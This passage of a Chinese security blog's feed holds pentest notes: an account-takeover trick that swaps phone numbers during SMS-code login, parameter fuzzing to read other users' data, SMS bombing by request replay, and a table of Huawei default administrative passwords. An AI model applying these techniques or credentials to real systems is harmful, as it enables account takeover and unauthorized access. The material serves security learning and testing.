      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;随着等保2.0的到来，再一次掀起了网络安全的热潮，为了让大家更好的理解等级保护，决定整理此文，内容来自互联网搜集。&lt;/p&gt;
    
    </summary>
    
      <category term="等级保护" scheme="https://www.mad-coding.cn/categories/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
    
      <category term="等级保护" scheme="https://www.mad-coding.cn/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/"/>
    
  </entry>
  
  <entry>
    <title>网络安全法</title>
    <link href="https://www.mad-coding.cn/2019/10/24/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    <id>https://www.mad-coding.cn/2019/10/24/网络安全法/</id>
    <published>2019-10-24T02:04:37.000Z</published>
    <updated>2019-10-28T08:50:57.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>法律，是每个公民必须要遵守的准则，触犯法律的底线将受到法律的惩罚。随着2016年11月7日《中华人民共和国网络安全法》的发布，意味着每一个网络也不是法外之地，任何人都要遵守法律，不搞黑产，不入侵计算机，不盗窃用户的数据等等。</p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;法律，是每个公民必须要遵守的准则，触犯法律的底线将受到法律的惩罚。随着2016年11月7日《中华人民共和国网络安全法》的发布，意味着每一个网络也不是法外之地，任何人都要遵守法律，不搞黑产，不入侵计算机，不盗窃用户的数据等等。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="法律" scheme="https://www.mad-coding.cn/tags/%E6%B3%95%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>漏洞案例大全</title>
    <link href="https://www.mad-coding.cn/2019/10/18/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E5%A4%A7%E5%85%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/18/漏洞案例大全/</id>
    <published>2019-10-18T09:01:05.000Z</published>
    <updated>2019-10-28T08:42:54.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>每天工作之余卡在微信公众号或者订阅的博客中看看别人写的文章，但是我相信肯定有人和我一样，看完文章以后的感觉</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/b1a663d5adb16eb9" class="lozad"></p><p>然后，就没有然后了，可能当时的确学习到了别人的思路或者想法，但是在短的时间内要吃透别人的文章是不可能的，所以这里作为自己的漏洞案例大全，将自己在渗透测试过程中或者看到好的文章中的一些漏洞的案例记录下来，在时间允许的情况下加以分类。方便自己，帮助他人，共勉~</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/816554f290b20da5" class="lozad"></p><a id="more"></a><h1 id="0x01-越权"><a href="#0x01-越权" class="headerlink" title="0x01 越权"></a>0x01 越权</h1><h2 id="1-1-越权访问"><a href="#1-1-越权访问" class="headerlink" title="1.1 越权访问"></a>1.1 越权访问</h2><h3 id="1-1-1-Fuzz大法之挖掘潜的逻辑越权"><a href="#1-1-1-Fuzz大法之挖掘潜的逻辑越权" class="headerlink" title="1.1.1 Fuzz大法之挖掘潜的逻辑越权"></a>1.1.1 Fuzz大法之挖掘潜的逻辑越权</h3><p>对一个网站做测试的时候发现了这样一条请求：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163710.png" class="lozad"></p><p>一开始的想法是变为 GET 请求（可行），然后增加 JSONP 劫持的回调参数。。。（失败）,之前也有人问我怎么去做参数字典的收集：<br>A. 注意网站参数的命名方式</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163735.png" class="lozad"></p><p>大写、英文<br>B. 返回变参数（注意值都为 B 用户 也就是你需要准备两个用户）<br>上面所述的返回信息中包含了很多“参数”，可生成如下：</p><blockquote><p>userid=B 用户 id<br>login=B 用户名<br>password=B 用户密码<br>mobilenum=B 用户手机号<br>email=B 用户邮箱</p></blockquote><p>C. 整合</p><p>A 规则+B 收集=C 整合<br>最后变成如下的字典：</p><blockquote><p>USERID=B 用户 id<br>LOGIN=B 用户名<br>PASSWORD=B 用户密码<br>MOBILENUM=B 用户手机号<br>EMAIL=B 用户邮箱</p></blockquote><p>然后 Burp Intruder 模块开启，导入字典(这里将参数设在 POST 请求正文)，Start Fuzz：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163750.png" class="lozad"></p><p>测试结果发现使用 LOGIN 参数可以成功的从 A 用户的个人信息越权获取到 B 用户的个人信息～</p><h1 id="0x02-逻辑漏洞"><a href="#0x02-逻辑漏洞" class="headerlink" title="0x02 逻辑漏洞"></a>0x02 逻辑漏洞</h1><h2 id="2-1-登录任意账户"><a href="#2-1-登录任意账户" class="headerlink" title="2.1 登录任意账户"></a>2.1 登录任意账户</h2><h3 id="2-1-1-案例一"><a href="#2-1-1-案例一" class="headerlink" title="2.1.1 案例一"></a>2.1.1 案例一</h3><h4 id="【⽤户注册界⾯】"><a href="#【⽤户注册界⾯】" class="headerlink" title="【⽤户注册界⾯】"></a>【⽤户注册界⾯】</h4><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163802.png" class="lozad"></p><p>在输⼊⼿机号后，⿏标焦点转移到其它输⼊框，此时⽹⻚会发送⼀个ajax请求，验证⼿机号是否注册：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163921.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028163859.png" class="lozad"></p><p>⼿机号已注册返回flag为0，未注册flag为1，可以burp暴⼒跑出已注册⼿机号</p><h4 id="【登陆处】"><a href="#【登陆处】" class="headerlink" title="【登陆处】"></a>【登陆处】</h4><p>1.先输⼊⾃⼰的⼿机号，接收验证码</p><p>2.替换要登录的⼿机号</p><p>3.将⾃⼰⼿机号收到的验证码输⼊，即可登录他⼈账号</p><p>有两种登陆⽅式，我们选⼿机验证码登陆</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164112.png" class="lozad"></p><p>这⾥填我们⾃⼰的⼿机号，收到验证码后，把⼿机号改为前⼀步跑出的已注册⽤户，验证码⽤我们收到的，成功登陆：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164151.png" class="lozad"></p><h2 id="2-2-任意用户注册"><a href="#2-2-任意用户注册" class="headerlink" title="2.2 任意用户注册"></a>2.2 任意用户注册</h2><p>如果输⼊未注册的⼿机号，登陆，系统会默认这次登陆⾏为等同为注册</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164001.png" class="lozad"></p><p>登陆前，显⽰为未注册</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164013.png" class="lozad"></p><p>登陆后，⼿机号已注册，⼿机号原主⼈⽆法注册了</p><h2 id="2-3-短信炸弹"><a href="#2-3-短信炸弹" class="headerlink" title="2.3 短信炸弹"></a>2.3 短信炸弹</h2><h3 id="2-3-1-案例一"><a href="#2-3-1-案例一" class="headerlink" title="2.3.1 案例一"></a>2.3.1 案例一</h3><p>登陆处，这⾥对发送验证码做了两个限制：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164045.png" class="lozad"></p><blockquote><p>js做的限制</p><p>1.限制发送周期<br>2.需要填写⼿机号和正确的验证码</p></blockquote><p>这⾥的两个限制并不能杜绝短信炸弹：</p><blockquote><p>1.在js⾥限制发送周期是没⽤的，包重放就绕过了<br>2.验证码在⽣命周期内可以反复使⽤</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191018173721.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028164216.png" class="lozad"></p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;每天工作之余卡在微信公众号或者订阅的博客中看看别人写的文章，但是我相信肯定有人和我一样，看完文章以后的感觉&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i03piccdn.sogoucdn.com/b1a663d5adb16eb9&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后，就没有然后了，可能当时的确学习到了别人的思路或者想法，但是在短的时间内要吃透别人的文章是不可能的，所以这里作为自己的漏洞案例大全，将自己在渗透测试过程中或者看到好的文章中的一些漏洞的案例记录下来，在时间允许的情况下加以分类。方便自己，帮助他人，共勉~&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i03piccdn.sogoucdn.com/816554f290b20da5&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>华为账户信息一览表</title>
    <link href="https://www.mad-coding.cn/2019/10/16/%E5%8D%8E%E4%B8%BA%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF%E4%B8%80%E8%A7%88%E8%A1%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/16/华为账户信息一览表/</id>
    <published>2019-10-16T06:30:34.000Z</published>
    <updated>2019-10-16T06:51:01.516Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>弱口令是渗透测试中的一个非常常见也非常严重的一个漏洞，很多系统被入侵脱裤是从一个弱口令爆破成功开始的。这里记录一下华为设备的一些默认弱口令，为了方便以后自己查阅使用。</p><p><img alt="img" data-src="https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-9eef65073f0f6be0-1760dba9c1e181b0964c091e0af19e63.jpg" class="lozad"></p><a id="more"></a><h1 id="0x01-FusionManager"><a href="#0x01-FusionManager" class="headerlink" title="0x01 FusionManager"></a>0x01 FusionManager</h1><table><thead><tr><th>账户说明</th><th>默认账号</th></tr></thead><tbody><tr><td>FusionManager帐户</td><td>用户名：admin密码：Admin@123</td></tr><tr><td>FusionManager帐户<strong>说明：</strong>使用该帐户登录FusionManager并跳转到FusionCompute后，拥有FusionCompute系统的所有管理和维护权限。使用其余帐户跳转到FusionCompute后，只能查看数据和修改告警阈值。</td><td>用户名：geadmin密码：Admin@123</td></tr><tr><td>FusionManager节点操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用galaxmanager帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：Huawei@001</td></tr><tr><td>FusionManager节点操作系统帐户（业务帐户）</td><td>用户名：galaxmanager密码：GalaxManager_2012</td></tr><tr><td>FusionManager访问数据库的帐户</td><td>用户名：galaxmanager密码：GalaxManager7!</td></tr><tr><td>FusionManager数据库的帐户</td><td>用户名：cloudmgr密码：Manager@123</td></tr><tr><td>FusionManager数据库默认的系统帐户</td><td>用户名：sys密码：System@123</td></tr></tbody></table><h1 id="0x02-FusionCompute"><a href="#0x02-FusionCompute" class="headerlink" title="0x02 FusionCompute"></a>0x02 FusionCompute</h1><table><thead><tr><th>账号说明</th><th>默认账号</th></tr></thead><tbody><tr><td>主机的操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用gandalf帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：Huawei_123</td></tr><tr><td>主机的操作系统帐户（业务帐户）</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>VRM节点的操作系统帐户不能直接使用root帐户登录。若需要使用root帐户，需先用gandalf帐户登录，然后执行<strong>su - root</strong>切换到root帐户。</td><td>用户名：root密码：root</td></tr><tr><td>VRM节点的操作系统帐户（业务帐户）</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>FusionCompute访问数据库的帐户</td><td>用户名：galax密码：SingleLOUD!1</td></tr><tr><td>管理节点VNC登录帐户</td><td>用户名：root密码：GalaX088</td></tr></tbody></table><h1 id="0x03-FusionStorage"><a href="#0x03-FusionStorage" class="headerlink" title="0x03 FusionStorage"></a>0x03 FusionStorage</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>FusionStorage Manager节点操作系统帐户</td><td>用户名：root密码：UVP_2012lab</td></tr><tr><td>FusionStorage Manager节点操作系统的业务帐户</td><td>用户名：dsware密码：dsmHuawei@123</td></tr><tr><td>FusionStorage访问数据库的帐户</td><td>用户名：omm密码：ommHuawei@123</td></tr></tbody></table><h1 id="0x04-内部部件通讯账户"><a href="#0x04-内部部件通讯账户" class="headerlink" title="0x04  内部部件通讯账户"></a>0x04  内部部件通讯账户</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>FusionManager对FusionCompute的内部通讯帐户</td><td>用户名：GERest密码：Rest@GE123</td></tr><tr><td>FusionCompute对FusionManager的内部通讯帐户</td><td>用户名：gmsysman密码：GMEnginE@123</td></tr><tr><td>FusionManager对FusionStorage的内部通讯帐户</td><td>用户名：OmmRest密码：Omm@1234</td></tr><tr><td>FusionStorage对FusionManager的内部通讯帐户</td><td>用户名：gmadmin密码：gmHuawei@123</td></tr><tr><td>FusionManager内部的通讯帐户</td><td>用户名：GmUhmRest密码：Rest@GmUhm123</td></tr><tr><td>FusionCompute内部的通讯帐户</td><td>用户名：gesysman密码：GeEnginE@123</td></tr></tbody></table><h2 id="FusionStorage对外提供的Rest接口帐户"><a href="#FusionStorage对外提供的Rest接口帐户" class="headerlink" title="FusionStorage对外提供的Rest接口帐户"></a>FusionStorage对外提供的Rest接口帐户</h2><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionStorage对其他Rest接口帐户提供的接口帐户</td><td>用户名：admin密码：Huawei@123</td></tr><tr><td>FusionStorage对健康检查工具提供的接口帐户</td><td>用户名：healthycheckadmin密码：hcHuawei@123</td></tr><tr><td>FusionStorage对CLI命令行界面提供的接口帐户</td><td>用户名：cmdadmin密码：cmdHuawei@123</td></tr><tr><td>FusionStorage对升级补丁提供的接口帐户</td><td>用户名：upadmin密码：upHuawei@123</td></tr><tr><td>FusionStorage预留的Rest接口帐户</td><td>用户名：rsadmin密码：rsHuawei@123</td></tr><tr><td>FusionStorage对HA机制提供的接口帐户</td><td>用户名：haadmin密码：haHuawei@123</td></tr><tr><td>FusionStorage对OMM内部模块提供的接口帐户</td><td>用户名：systemman密码：Admin@123</td></tr><tr><td>FusionStorage对FusionCompute提供的接口帐户</td><td>用户名：geadmin密码：geHuawei@123</td></tr></tbody></table><h1 id="0x05-FusionManager访问硬件设备的帐户"><a href="#0x05-FusionManager访问硬件设备的帐户" class="headerlink" title="0x05 FusionManager访问硬件设备的帐户"></a>0x05 FusionManager访问硬件设备的帐户</h1><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionManager访问主机操作系统的帐户</td><td>用户名：gandalf密码：Pwd8800_magic$</td></tr><tr><td>FusionManager访问主机BMC的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问机框的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问存储设备的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr><tr><td>FusionManager访问交换机的帐户</td><td>用户名：uhmroot密码：UhmRoot@2012</td></tr></tbody></table><h1 id="0x06-FTP账户"><a href="#0x06-FTP账户" class="headerlink" title="0x06 FTP账户"></a>0x06 FTP账户</h1><table><thead><tr><th></th><th>默认账户</th></tr></thead><tbody><tr><td>FusionCompute下发CNA、Tools补丁到主机上的帐户</td><td>用户名：ftppatchuser密码：Patch_123</td></tr><tr><td>日志服务器FTP帐户</td><td>用户名：cnalog密码：1q2w3e~!</td></tr></tbody></table><h1 id="0x07-硬件设备账户"><a href="#0x07-硬件设备账户" class="headerlink" title="0x07 硬件设备账户"></a>0x07 硬件设备账户</h1><table><thead><tr><th>账户说明</th><th>默认账户</th></tr></thead><tbody><tr><td>E6000服务器刀片BMC系统帐户</td><td>用户名：root密码：root</td></tr><tr><td>E6000服务器管理模块帐户</td><td>用户名：root密码：huaweiosta</td></tr><tr><td>E9000服务器刀片BMC系统帐户</td><td>用户名：root密码：Huawei12#$</td></tr><tr><td>E9000服务器管理模块帐户</td><td>用户名：root密码：Huawei12#$</td></tr><tr><td>IP SAN存储管理系统帐户</td><td>用户名：admin密码：Admin@storage</td></tr></tbody></table><h1 id="0x08-参考文档"><a href="#0x08-参考文档" class="headerlink" title="0x08 参考文档"></a>0x08 参考文档</h1><p><a href="http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000028274&amp;partNo=10062" target="_blank" rel="noopener">http://support.huawei.com/enterprise/docinforeader!loadDocument1.action?contentId=DOC1000028274&amp;partNo=10062</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;弱口令是渗透测试中的一个非常常见也非常严重的一个漏洞，很多系统被入侵脱裤是从一个弱口令爆破成功开始的。这里记录一下华为设备的一些默认弱口令，为了方便以后自己查阅使用。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://img03.sogoucdn.com/app/a/100520093/e18d20c94006dfe0-9eef65073f0f6be0-1760dba9c1e181b0964c091e0af19e63.jpg&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="社工工程学" scheme="https://www.mad-coding.cn/categories/%E7%A4%BE%E5%B7%A5%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
    
    
      <category term="社工" scheme="https://www.mad-coding.cn/tags/%E7%A4%BE%E5%B7%A5/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite专题学习指南</title>
    <link href="https://www.mad-coding.cn/2019/10/15/burpsuite%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%8D%97/"/>
    <id>https://www.mad-coding.cn/2019/10/15/burpsuite专题学习指南/</id>
    <published>2019-10-15T13:25:44.000Z</published>
    <updated>2019-10-16T02:54:19.861Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484189&idx=1&sn=6c5873495cc2c174b0db3ced494cbce1&chksm=ec1f5622db68df34503f9a0410d83efc367f5da3c5d9264cb64e9f6f2577c12c4a59f36e68db&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(一)—-Proxy模块(代理模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484192&idx=1&sn=998ae5b52c071ecc7234fffb6e58a690&chksm=ec1f561fdb68df09b3aee7a1751659fcf1f9e8f739d9fd3d5fb59ef24f2c4b53e565c8079348&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(二)—-Target模块(目标模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484195&idx=1&sn=0e054c30f5c14ffc012678c26326d46f&chksm=ec1f561cdb68df0a37f4aec1150dbcad5c7b2c0b294cfe4490349d802178fd26a05ff8d05d56&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(三)—-Spider模块(蜘蛛爬行)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484213&idx=1&sn=e9eea6b651e5d39b2a1d9a373db97ea6&chksm=ec1f560adb68df1cc5a14040d8a7c1783ba9098f01d7499bf15d20eb1de50449d2a2d39634ef&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(四)—-Scanner模块(漏洞扫描)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484215&idx=1&sn=56368486f712b349113c11c9d5139d92&chksm=ec1f5608db68df1ebef0fcc0870bbcaa8f7b03b178dcdcebd0e6d33d3ea74fd397419ac6a4d1&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(五)—-Intruder模块(暴力破解)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484216&idx=1&sn=345bcb5cd8b598a6b5b2b792c374a78f&chksm=ec1f5607db68df11317d09f8dc06966cec1679b182760ea09848e8692546de19e641e81f8272&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(六)—-Repeater模块(中继器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484217&idx=1&sn=855efefe772c27635c5fb3d993d331fa&chksm=ec1f5606db68df106caa857983d65168a6168ba7090327ef540213f5b97e28af5f85994d21e9&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(七)—-Sequencer模块(定序器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484218&idx=1&sn=7e863b2c0b02e188971bbe24055b2a2e&chksm=ec1f5605db68df134d14d971f06500a78eca76578a134f693b00f6e356dc425b4a92194d1ed1&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(八)—-decoder模块(编码模块)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484218&idx=2&sn=6aadd3f1d183d59348ad7c1d446d5152&chksm=ec1f5605db68df130268ef885705122354e79f677be3c61f625ab54d9b2c77d58d7f3d253164&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(九)—-Comparer模块(比较器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484219&idx=1&sn=de0e90b15f8f774688ab198654e7e861&chksm=ec1f5604db68df1215920b3f8e1a05bbce557b821e1aa32de0a511f8b1a9ddd63fcee9ab869d&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十)—-Extender模块(扩展器)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484220&idx=1&sn=5c2c4b50fd0305ce06f86fdcbe50833c&chksm=ec1f5603db68df15800342dd58ecebb71318c901b86a1e73e510a22bd0964ddcfd2bec5423c5&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十一)—-Project options模块(项目选择)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247484221&idx=1&sn=c7d96cfd3f44ddf7974bb0f5a666722a&chksm=ec1f5602db68df1445eb53adf08d3232e23a4a9f1f7a06608f2dd322e0cbda294a67ee1fe4df&scene=21#wechat_redirect" target="_blank" rel="noopener">BurpSuite系列(十二)—-User options模块(用户选择)</a></p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="burpsuite" scheme="https://www.mad-coding.cn/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>X-Ray白皮书</title>
    <link href="https://www.mad-coding.cn/2019/10/12/X-Ray%E7%99%BD%E7%9A%AE%E4%B9%A6/"/>
    <id>https://www.mad-coding.cn/2019/10/12/X-Ray白皮书/</id>
    <published>2019-10-12T09:34:48.000Z</published>
    <updated>2019-10-28T08:58:07.682Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在之前介绍过一篇长亭科技开发的工具叫X-ray，今天在网上看到了这款工具的白皮书，为了防止以后找不到了，这里直接以文章的形式记录下来。如有侵权，请联系删除！</p><a id="more"></a><h1 id="0x01-如何有效进行安全评估？"><a href="#0x01-如何有效进行安全评估？" class="headerlink" title="0x01 如何有效进行安全评估？"></a>0x01 如何有效进行安全评估？</h1><p>70%的网站存在漏洞，可能导致资金被盗、用户隐私信息泄露、系统瘫痪等问题。<br>2017年全球泄露或被盗的数据超过50亿条，其中仅上半年就达到19亿条，超过<br>了2016年全年被盗数据总量。CNNVD公布的2017年漏洞数量为14,748个，2016年<br>全年的漏洞总数为8,753个，年增长率达到了70%。面对逐年激增的漏洞与信息泄露事件，企业必须建立一套完善的安全评估系统。而企业目前所面临的安全评估或多或少都存在着一些问题。<br>【资产发现难】<br>• 企业规模不断扩大，难以审计大量新设备；<br>• 员工自带设备（BYOD）存在各种隐形威胁；<br>• 各种小实验室、小型办公网络难以监控。<br>【扫描能力弱】<br>• 爬虫能力弱，难以发现内网服务、设备存在的安全问题或未修复的漏洞；<br>• 无法自动发现扫描目标，无法自定义扫描资产、漏洞类型，用户体验差。<br>应急响应无力：<br>• 漏洞爆发，无法在极短时间内对整个内网的大规模设备群进行清查。<br>伸缩与扩展性差：<br>• 只能在部署时既定的区域内进行扫描工作，无法应对不断变化的企业内网环境。<br>• 在不同的网络之间扫描可能会带来冲突，实际使用效率大打折扣。</p><h1 id="0x02-X-Ray安全评估系统"><a href="#0x02-X-Ray安全评估系统" class="headerlink" title="0x02 X-Ray安全评估系统"></a>0x02 X-Ray安全评估系统</h1><p>（X-Ray）是由长亭安全团队基于扎实攻防经验，历经多年实战打磨的一款集合资产管理、Web扫描、主机扫描为一体的安全评估系统。<br>X-Ray安全评估系统，将人工检测漏洞的思维路径转化成机器语言，X-Ray实现了自动化精准漏洞识别，可发现大规模资产并进行方便快捷管理，同时提供详细的漏洞信息及修复策略，快速、全面地修复系统漏洞。</p><h2 id="2-1-高度自定义，扫描深度隐藏漏洞"><a href="#2-1-高度自定义，扫描深度隐藏漏洞" class="headerlink" title="2.1 高度自定义，扫描深度隐藏漏洞"></a>2.1 高度自定义，扫描深度隐藏漏洞</h2><p>（X-Ray）提供主机扫描和Web扫描功能，企业可以定期对网络进行扫描，帮助及时发现威胁，客观评估风险等级，根据扫描结果修复安全漏洞，在攻击者发起攻击前做到防患于未然。<br>企业网络环境不断更新迭代，一成不变的扫描方法显然不能应对层出不穷的安全威胁。企业需要一个可以灵活定制的安全评估系统，根据自身需求调整扫描策略。（X-Ray）提供丰富的自定义功能模板，用户可选择单个或自由组合扫描模块，真正实现高度自定义扫描，尽可能从交叉维度更全面地发现安全问题。<br>同时，为了应对不同的网络环境和内部管理需求，X-Ray可实现多工作区管理，支持对网络、部门、个人三个层面进行逻辑隔离：同一个用户可以在多个不同的工作区之间切换，不同的用户可以共享一个工作区达到协同工作的目的。在扫描过程中，每个扫描任务独立进行，扫描速度不受网站复杂程度影响。</p><h2 id="2-2-主机扫描"><a href="#2-2-主机扫描" class="headerlink" title="2.2 主机扫描"></a>2.2 主机扫描</h2><p>X-Ray可对主机或者网段进行扫描，识别其中存活的主机以及开放的端口，并通过对端口进行指纹识别，获取端口的协议、服务、应用等信息，进而制定扫描策略。<br>扫描过程中，X-Ray利用对应的POC进行测试，找出主机中存在的漏洞，扫描结果输出资产及漏洞信息。长亭漏洞库由安全团队专人维护，实时更新高质量漏洞，保证发现率，出现新漏洞时能做到迅速响应以避免损失。</p><h2 id="2-3-Web扫描"><a href="#2-3-Web扫描" class="headerlink" title="2.3 Web扫描"></a>2.3 Web扫描</h2><p>X-Ray支持通过收集网站信息，对网站结构进行建模，根据数据信息发起漏洞探测，从而确定网站可能遭受的风险。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191012174121.png" 